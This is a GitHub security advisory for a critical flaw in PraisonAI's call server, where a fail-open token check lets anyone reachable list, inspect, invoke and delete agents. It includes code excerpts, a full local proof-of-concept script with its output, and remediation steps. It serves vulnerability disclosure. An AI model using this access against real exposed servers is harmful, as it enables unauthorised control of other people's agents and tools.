# [C] PraisonAI call server exposes unauthenticated agent listing, invocation, and deletion when CALL_SERVER_TOKEN is unset

## Summary
Severity: Critical
Advisory: GHSA-86qc-r5v2-v6x6
CVE: CVE-2026-47396
CWE: CWE-284, CWE-306
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H (CVSS_V3)
Published: 2026-05-29
Source: https://github.com/advisories/GHSA-86qc-r5v2-v6x6
Type: github-advisory

## Affected
- PyPI: `PraisonAI` — affected >=0 <4.6.40

## Details
### Summary

PraisonAI's call server exposes a network-facing agent control API without authentication when `CALL_SERVER_TOKEN` is not configured.

The affected component is the `praisonai.api.agent_invoke` router as mounted by `praisonai.api.call`. The authentication helper `verify_token()` fails open when `CALL_SERVER_TOKEN` is unset. Since every sensitive agent-control endpoint depends on this helper, starting the call server without a token allows any reachable client to list agents, inspect agent metadata and instructions, invoke agents, and unregister agents.

This is security-relevant because the bundled call server includes the vulnerable router and binds to `0.0.0.0`. As a result, operators who launch the call server without explicitly setting `CALL_SERVER_TOKEN` may unintentionally expose an unauthenticated remote agent control plane.

### Details

The vulnerable behavior is caused by a fail-open authentication default.

In `praisonai/api/agent_invoke.py`, `CALL_SERVER_TOKEN` is read from the environment:

```python
CALL_SERVER_TOKEN = os.getenv('CALL_SERVER_TOKEN')
```

The authentication dependency then returns successfully when the token is not configured:

```python
async def verify_token(request: Request, authorization: Optional[str] = Header(None)) -> None:
    if not FASTAPI_AVAILABLE or not CALL_SERVER_TOKEN:
        return  # No authentication if FastAPI unavailable or no token set
```

This means that the absence of `CALL_SERVER_TOKEN` disables authentication entirely.

The same helper is used by sensitive agent-control routes, including:

```python
@router.post("/agents/{agent_id}/invoke")
async def invoke_agent(..., _: None = Depends(verify_token))

@router.get("/agents")
async def list_agents(_: None = Depends(verify_token))

@router.delete("/agents/{agent_id}")
async def unregister_agent_endpoint(agent_id: str, _: None = Depends(verify_token))

@router.get("/agents/{agent_id}")
async def get_agent_info(agent_id: str, _: None = Depends(verify_token))
```

These endpoints allow a caller to:

- list registered agents;
- retrieve agent metadata;
- retrieve agent instruction text;
- invoke agents;
- unregister agents.

The vulnerable router is mounted by the call server:

```python
from .agent_invoke import router as agent_invoke_router
app.include_router(agent_invoke_router)
```

The call server then listens on all interfaces:

```python
uvicorn.run(app, host="0.0.0.0", port=port, log_level="warning")
```

Therefore, when `praisonai-call` is started without `CALL_SERVER_TOKEN`, the agent-control API becomes reachable without authentication from any client that can access the server.

### PoC

The following local PoC imports the real `praisonai.api.agent_invoke` router from source, ensures `CALL_SERVER_TOKEN` is absent, registers a demo agent, mounts the router into a local FastAPI app, and sends unauthenticated requests to the vulnerable endpoints.

The PoC proves that, without sending any authentication material:

1. `GET /api/v1/agents` returns the list of registered agents.
2. `GET /api/v1/agents/{agent_id}` exposes agent metadata and instructions.
3. `POST /api/v1/agents/{agent_id}/invoke` executes the registered agent.
4. `DELETE /api/v1/agents/{agent_id}` unregisters the agent.

Run with:

```bash
PRAISONAI_REPO=/path/to/PraisonAI python -B embedded_poc.py
```

Full PoC:

```python
#!/usr/bin/env python3
from __future__ import annotations

import os
import sys
from pathlib import Path
from types import SimpleNamespace


REPO_ROOT = Path(os.environ.get("PRAISONAI_REPO", "/path/to/PraisonAI")).resolve()
PRAISON_ROOT = REPO_ROOT / "src" / "praisonai"


def verify_source() -> None:
    expected = {
        PRAISON_ROOT / "praisonai/api/agent_invoke.py": [
            "CALL_SERVER_TOKEN = os.getenv('CALL_SERVER_TOKEN')",
            "if not FASTAPI_AVAILABLE or not CALL_SERVER_TOKEN:",
            '@router.post("/agents/{agent_id}/invoke")',
            '@router.get("/agents")',
            '@router.delete("/agents/{agent_id}")',
            '@router.get("/agents/{agent_id}")',
        ],
        PRAISON_ROOT / "praisonai/api/call.py": [
            "app.include_router(agent_invoke_router)",
            'uvicorn.run(app, host="0.0.0.0", port=port, log_level="warning")',
        ],
    }

    for path, needles in expected.items():
        if not path.exists():
            raise RuntimeError(f"source verification failed: file not found: {path}")

        text = path.read_text(encoding="utf-8")
        for needle in needles:
            if needle not in text:
                raise RuntimeError(f"source verification failed: {needle!r} not found in {path}")


class DemoAgent:
    name = "demo-agent"
    instructions = "super-secret instructions"
    tools = [SimpleNamespace(name="danger-tool")]

    def start(self, message: str) -> str:
        return f"echo:{message}"


def main() -> int:
    verify_source()

    os.environ.pop("CALL_SERVER_TOKEN", None)
    sys.path.insert(0, str(PRAISON_ROOT))

    from fastapi import FastAPI
    from fastapi.testclient import TestClient
    from praisonai.api.agent_invoke import CALL_SERVER_TOKEN, register_agent, router

    app = FastAPI()
    app.include_router(router)

    register_agent("demo", DemoAgent())

    client = TestClient(app)

    list_resp = client.get("/api/v1/agents")
    info_resp = client.get("/api/v1/agents/demo")
    invoke_resp = client.post("/api/v1/agents/demo/invoke", json={"message": "hello"})
    delete_resp = client.delete("/api/v1/agents/demo")

    print(f"[poc] token_configured={bool(CALL_SERVER_TOKEN)}")
    print(f"[poc] list_status={list_resp.status_code} body={list_resp.json()}")
    print(f"[poc] info_status={info_resp.status_code} body={info_resp.json()}")
    print(f"[poc] invoke_status={invoke_resp.status_code} body={invoke_resp.json()}")
    print(f"[poc] delete_status={delete_resp.status_code} body={delete_resp.json()}")

    if CALL_SERVER_TOKEN:
        raise SystemExit("[poc] MISS: CALL_SERVER_TOKEN unexpectedly set in test process")

    if list_resp.status_code != 200 or "demo" not in list_resp.json().get("agents", []):
        raise SystemExit("[poc] MISS: unauthenticated agent listing failed")

    if info_resp.status_code != 200 or info_resp.json().get("instructions") != "super-secret instructions":
        raise SystemExit("[poc] MISS: unauthenticated agent info leak failed")

    if invoke_resp.status_code != 200 or invoke_resp.json().get("result") != "echo:hello":
        raise SystemExit("[poc] MISS: unauthenticated agent invocation failed")

    if delete_resp.status_code != 200:
        raise SystemExit("[poc] MISS: unauthenticated agent unregister failed")

    print("[poc] HIT: unauthenticated caller listed, inspected, invoked, and unregistered the demo agent")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
```

Observed result:

```text
[poc] token_configured=False
[poc] list_status=200 body={'agents': ['demo'], 'count': 1, 'status': 'success'}
[poc] info_status=200 body={'agent_id': 'demo', 'status': 'registered', 'type': 'DemoAgent', 'name': 'demo-agent', 'instructions': 'super-secret instructions', 'tools': ['danger-tool']}
[poc] invoke_status=200 body={'result': 'echo:hello', 'session_id': 'default', 'status': 'success', 'metadata': {'agent_id': 'demo', 'message_length': 5, 'response_length': 10}}
[poc] delete_status=200 body={'message': "Agent 'demo' unregistered successfully", 'status': 'success'}
[poc] HIT: unauthenticated caller listed, inspected, invoked, and unregistered the demo agent
```

This confirms that the agent-control endpoints are accessible without authentication when `CALL_SERVER_TOKEN` is unset.

### Impact

If an operator runs the PraisonAI call server without explicitly setting `CALL_SERVER_TOKEN`, any reachable client may be able to:

- enumerate registered agents;
- read agent metadata;
- read agent instruction text;
- invoke agents;
- trigger downstream tools or external integrations connected to agents;
- consume model or API budget through repeated invocation;
- unregister agents and disrupt availability.

The impact depends on the deployed agents and their connected tools. For agents wired to external APIs, internal systems, local tools, or privileged actions, this creates a remote unauthenticated control surface.

The issue is not limited to information disclosure. The unauthenticated `invoke` endpoint can trigger agent execution, and the unauthenticated `delete` endpoint can remove registered agents.

### Suggested remediation

Recommended fixes:

1. Fail closed when `CALL_SERVER_TOKEN` is unset.

   The authentication dependency should reject requests unless authentication is explicitly configured and a valid token is supplied.

2. Refuse to mount the agent invocation router unless authentication is configured.

3. If unauthenticated mode is intended for local development, bind to `127.0.0.1` by default when `CALL_SERVER_TOKEN` is absent.

4. Add a startup error or highly visible warning when the call server is started without authentication.

5. Add regression tests that assert `401 Unauthorized` for all sensitive agent routes when no valid token is supplied.

6. Consider requiring an explicit unsafe flag, such as `--allow-unauthenticated-call-server`, before allowing the server to start without authentication.

### Security boundary

This report concerns the default authentication behavior of a network-facing server component. The issue is not that users can intentionally disable authentication for trusted local development. The issue is that the server fails open when `CALL_SERVER_TOKEN` is missing while the bundled server binds to `0.0.0.0`, which can expose the agent-control API remotely.

## References
- https://github.com/MervinPraison/PraisonAI/security/advisories/GHSA-86qc-r5v2-v6x6
- https://github.com/MervinPraison/PraisonAI
